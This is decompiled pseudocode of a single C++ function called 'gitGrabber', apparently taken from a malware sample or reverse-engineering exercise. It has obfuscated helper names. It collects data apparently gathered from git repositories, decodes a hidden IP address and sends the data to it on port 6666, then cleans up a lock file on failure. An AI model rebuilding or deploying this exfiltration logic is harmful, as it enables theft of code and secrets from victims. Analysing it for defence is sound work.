
void gitGrabber(void)

{
  long lVar1;
  bool bVar2;
  int __fd;
  int iVar3;
  char *pcVar4;
  char *ip_00;
  size_t length;
  long in_FS_OFFSET;
  int successful;
  int lockfd;
  int rv;
  char *output;
  char *ip;
  char *lockfile;
  string tmp;
  basic_string local_1c8 [32];
  stringstream ss;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  bVar2 = false;
  std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::
  basic_stringstream();
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();
                    /* try { // try from 0010a283 to 0010a3e5 has its CatchHandler @ 0010a416 */
  git_libgit2_init();
  __fd = qyvqmmhtjmlie();
  if (((__fd != -1) && (iVar3 = ndldgaiugwdhv(), iVar3 == 0)) &&
     (iVar3 = dxfivqvkpuunm(&ss), iVar3 == 0)) {
    std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::str();
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=
              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&tmp,local_1c8);
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_1c8);
    pcVar4 = (char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::
                     c_str();
    ip_00 = tgexpgbgxulli(0x13);
    length = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
    iVar3 = kvhlfowzlznog(ip_00,0x1a0a,pcVar4,length);
    aotxxfxjjvuoy(0x13);
    if (iVar3 == 0) {
      bVar2 = true;
    }
  }
  git_libgit2_shutdown();
  if ((__fd != -1) && (close(__fd), !bVar2)) {
    pcVar4 = tgexpgbgxulli(6);
    unlink(pcVar4);
    aotxxfxjjvuoy(6);
  }
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&tmp);
  std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::
  ~basic_stringstream((basic_stringstream<char,std::char_traits<char>,std::allocator<char>> *)&ss);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}


